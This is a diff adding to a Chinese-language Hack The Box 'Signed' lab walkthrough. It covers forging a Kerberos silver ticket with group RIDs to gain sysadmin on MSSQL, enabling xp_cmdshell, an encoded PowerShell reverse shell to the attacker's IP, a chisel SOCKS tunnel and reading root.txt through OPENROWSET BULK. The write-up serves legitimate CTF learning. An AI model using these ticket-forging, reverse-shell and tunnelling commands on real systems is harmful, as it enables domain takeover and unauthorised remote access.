@@ -1,4 +1,5 @@
 ## Signed
+### 0xdf教会了我很对mssql
 ```
 [★]$ nmap -sCV 10.129.242.173
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-19 03:47 CDT
@@ -468,3 +469,364 @@ SIGNED.HTB\Administrator   SIGNED.HTB\Administrator
 ```
 #### 遗憾的是，如上所示，数据库的设置使得管理员用户没有任何有用的权限
 ### TGS with IT Group
+```
+QL (SIGNED\Administrator  guest@master)> select SUSER_SID('Signed\IT')
+                                                              
+-----------------------------------------------------------   
+b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'   
+
+```
+#### 那是 RID 1105：
+```
+[★]$ python3 -c 'print(0x451)'
+1105
+
+# hex → decimal
+python3 -c 'print(0x451)'
+
+# decimal → hex
+python3 -c 'print(hex(1105))'
+```
+#### 我会把以下内容添加-groups 1105到工单中：RID（Relative ID）= 用户或组的标识
+```
+[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 Administrator 
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for signed.htb/Administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+```
+#### 并连接：
+```
+[★]$ KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k DC01.signed.htb
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to 'master'.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
+[!] Press help for extra shell commands
+SQL (SIGNED\Administrator  dbo@master)>
+```
+#### 它立即显示用户为 dbo，而不是 guest！
+### Execution / Shell
+#### 凭借系统管理员权限（通过 IT 组成员身份），我可以启用xp_cmdshell：
+```
+SQL (SIGNED\Administrator  dbo@master)> enable_xp_cmdshell
+INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell whoami
+output            
+---------------   
+signed\mssqlsvc   
+
+NULL
+```
+#### 无论我以哪个用户身份连接到数据库，数据库都是以 mssqlsvc 用户身份在主机上运行命令的。不过，这足以获取用户标志：
+```
+SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell "dir C:\Users\mssqlsvc\Desktop"
+output                                               
+--------------------------------------------------   
+ Volume in drive C has no label.                     
+
+ Volume Serial Number is BED4-436E                   
+
+NULL                                                 
+
+ Directory of C:\Users\mssqlsvc\Desktop              
+
+NULL                                                 
+
+10/02/2025  09:50 AM    <DIR>          .             
+
+10/02/2025  09:50 AM    <DIR>          ..            
+
+03/20/2026  10:57 PM                34 user.txt      
+
+               1 File(s)             34 bytes        
+
+               2 Dir(s)   6,392,795,136 bytes free   
+
+NULL                                                 
+
+SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell "type C:\Users\mssqlsvc\Desktop\user.txt"
+```
+#### 我还可以从revshells.com获取 PowerShell rev shell ：
+```
+SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQAzADkAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+```
+```
+[★]$ sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.15.139] from (UNKNOWN) [10.129.242.173] 52430
+whoami
+signed\mssqlsvc
+PS C:\Windows\system32>
+PS C:\Windows\system32> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                        State   
+============================= ================================== ========
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking           Enabled 
+SeCreateGlobalPrivilege       Create global objects              Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set     Disabled
+```
+#### 当 MSSQL 服务在启动时启动，Windows 会对 mssqlsvc 帐户进行身份验证并创建登录会话。LSASS 会存储此初始令牌，以便在网络身份验证期间使用。服务帐户默认被授予此SeImpersonatePrivilege权限，而 MSSQL 也合法地使用模拟来处理不同安全上下文下的客户端连接。因此，可以合理地假设原始令牌具有此权限。正如我上面所示，以 mssqlsvc 身份运行的 shell 没有此权限SeImpersonatePrivilege，这意味着该服务必须使用受限令牌运行，作为一种安全加固措施。
+#### SeImpersonatePrivilege = “允许当前进程假装成另一个用户的权限”
+#### mssqlsvc 的主目录为空：
+```
+PS C:\users\mssqlsvc> tree /f
+Folder PATH listing
+Volume serial number is BED4-436E
+C:.
+????Desktop
+?       user.txt
+?       
+????Documents
+????Downloads
+????Favorites
+????Links
+????Music
+????Pictures
+????Saved Games
+????Videos
+```
+#### 没有其他的感兴趣的用户
+```
+PS C:\users> ls
+
+
+    Directory: C:\users
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        10/7/2025   2:56 AM                Administrator                                                         
+d-----        10/2/2025   9:27 AM                mssqlsvc                                                              
+d-r---        4/10/2020  10:49 AM                Public
+```
+#### 驱动器也是空的
+```
+PS C:\> ls
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        10/7/2025   2:57 AM                inetpub                                                               
+d-----       10/10/2020   8:38 AM                PerfLogs                                                              
+d-r---        10/6/2025   8:30 AM                Program Files                                                         
+d-----        10/2/2025   9:25 AM                Program Files (x86)                                                   
+d-----        10/2/2025   9:19 AM                SQL2022                                                               
+d-r---        10/2/2025   9:27 AM                Users                                                                 
+d-----        10/7/2025   3:05 AM                Windows
+
+PS C:\> ls -la
+PS C:\> cd inetpub
+PS C:\inetpub> ls
+PS C:\inetpub> ls -la
+PS C:\inetpub> cd ..
+PS C:\> cd SQL2022
+PS C:\SQL2022> ls -la
+PS C:\SQL2022> ls
+PS C:\SQL2022> cd ..                                
+```
+#### inetpub它为空，SQL2022看起来也为空（实际上只是 mssqlsvc 无法访问，而且它也没什么用）。没有任何值得关注的安装程序
+### Tunnel
+#### 对于某些升级方法，通过本地主机使用代理来访问除 1433 端口之外的其他端口会很有用。我会上传Chisel：
+https://github.com/jpillora/chisel/releases/tag/v1.11.5
+```
+[★]$ unzip  chisel_1.11.5_windows_amd64.zip 
+Archive:  chisel_1.11.5_windows_amd64.zip
+  inflating: chisel.exe
+[★]$ python3 -m http.server 8011
+Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
+```
+```
+PS C:\programdata> iwr http://10.10.15.139:8011/chisel.exe -o chisel.exe
+```
+#### 将在我的主机上启动服务器./chisel_1.10.0_linux_amd64 server --reverse -p 8000并连接：
+```
+[★]$ gunzip chisel_1.11.5_linux_amd64.gz
+[★]$ chmod +x chisel_1.11.5_linux_amd64
+[★]$ ./chisel_1.11.5_linux_amd64 server --reverse -p 8000
+2026/03/21 01:57:35 server: Reverse tunnelling enabled
+2026/03/21 01:57:35 server: Fingerprint YLw4tLKGcBvnPyuVUyotISg1fXwso5zBwe7bhBW5tpw=
+2026/03/21 01:57:35 server: Listening on http://0.0.0.0:8000
+
+
+```
+#### 运行
+```
+PS C:\programdata> .\chisel.exe client 10.10.15.139:8000 R:socks
+```
+#### 程序卡住了，但服务器端连接正常：
+```
+[★]$ ./chisel_1.11.5_linux_amd64 server --reverse -p 8000
+2026/03/21 01:57:35 server: Reverse tunnelling enabled
+2026/03/21 01:57:35 server: Fingerprint YLw4tLKGcBvnPyuVUyotISg1fXwso5zBwe7bhBW5tpw=
+2026/03/21 01:57:35 server: Listening on http://0.0.0.0:8000
+2026/03/21 01:58:47 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+```
+| 类型     | 能不能用         |
+| ------ | ------------ |
+| socks5 | ✅ 推荐（必须优先）   |
+| socks4 | ⚠️ 有时能用，但不稳定 |
+```
+[★]$ sudo vi /etc/proxychains.conf
+[★]$ tail -n 6 /etc/proxychains.conf
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 	127.0.0.1 1080
+```
+#### 现在我可以访问其他端口，例如 SMB 端口：
+```
+[★]$ sudo proxychains netexec smb 127.0.0.1
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:135  ...  OK
+SMB         127.0.0.1       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:False)
+```
+### 0xdf 将展示三种在已签名系统上获取管理员或 SYSTEM 权限的方法：
+```
+--intended-->
+..unintended..>
+
+//利用 MSSQL 的文件读取 + 模拟权限 → 直接越权读 root.txt
+mssqlsvc Password ..> OPENROWSET BULK Impersonation ..> Read as any Group ..> root.txt
+//MSSQL 读凭据 → 横向登录 WinRM → 拿管理员 shell
+mssqlsvc Password ..> OPENROWSET BULK Impersonation ..> Read as any Group ..> Administrator Password ..> WinRM over Chisel Tunnel ..> Shell as Administrator --> root.txt
+
+//利用 NTLM 认证机制漏洞 → 中继成管理员
+mssqlsvc Password --> shell as mssqlsvc --> Chisel Scoks --> NTLM Relay --> ntlmrelayx WinRm --> Shell as Administrator --> root.txt
+
+//拿 token + Potato → 本地提权 SYSTEM
+mssqlsvc Password --> Shell as mssqlsvc ..> Recover Network Logon Token ..> GodPotato ..> Shell as SYSTEM ..> root.txt
+```
+| 路线             | 本质        |
+| -------------- | --------- |
+| OPENROWSET 读文件 | 权限滥用（最直接） |
+| 读密码 + WinRM    | 横向移动      |
+| NTLM Relay     | 协议攻击      |
+| GodPotato      | 本地提权      |
+### [1]via OPENROWSET BULK Impersonation | File Read
+#### 将在ticketer.py通话中添加两个选项：
+#### -user-id 1103- 强制用户 ID 为 mssqlsvc。
+#### -groups '512,1105'- 1105 是 IT 组，用于获取数据库的系统管理员权限。512 是域管理员组，不过任何具有域权限的组都可以，因为只有这样我才能访问文件
+```
+[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -user-id 1103 -groups '512,1105' doesntmatter
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for signed.htb/doesntmatter
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving ticket in doesntmatter.ccache
+```
+#### 会连接它：
+```
+[★]$ KRB5CCNAME=doesntmatter.ccache mssqlclient.py -no-pass -k DC01.signed.htb
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to 'master'.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
+[!] Press help for extra shell commands
+SQL (SIGNED\mssqlsvc  dbo@master)>
+```
+#### 仍然是 dbo 用户，并且显示为 mssqlsvc 帐户。如果我尝试xp_cmdshell读取 root 标志，则会失败：
+```
+SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "type C:\Users\Administrator\Desktop\root.txt"
+output              
+-----------------   
+Access is denied.   
+
+NULL
+```
+#### mssqlsvc 正在启动一个新cmd.exe进程，但它没有从工单中获取组信息。我可以明确地展示这一点：
+```
+SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "whoami /groups"
+output                                                                             
+--------------------------------------------------------------------------------   
+NULL                                                                               
+GROUP INFORMATION                                                                  
+-----------------                                                                  
+NULL                                                                               
+Group Name                                 Type             SID                                                             Attributes                                           
+========================================== ================ =============================================================== ==================================================   
+
+Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group   
+
+BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group   
+
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group   
+
+NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group   
+
+CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group   
+
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group   
+
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group   
+
+NT SERVICE\MSSQLSERVER                     Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner       
+
+LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group   
+
+Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group   
+
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                                         
+
+NULL                                                                               
+
+SQL (SIGNED\mssqlsvc  dbo@master)> 
+
+```
+#### 可以看出是xp_cmdshell 是以 MSSQL 服务账户 在执行
+#### 而且权限是：Mandatory Label\High Mandatory Level -- 高完整性（High Integrity）服务上下文
+#### 但是OPENROWSET使用BULK关键字可以读取使用这些组的文件：
+```
+SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
+BulkColumn                                
+---------------------------------------   
+b'cbfcf88****************************\r\n'   
+```
+### [2]Shell
+#### 管理员的 PowerShell 历史记录文件是一个值得阅读的文件：
+```
+SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS Contents;
+ERROR(DC01): Line 1: Cannot bulk load. The file "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" does not exist or you don't have file access rights.
+```
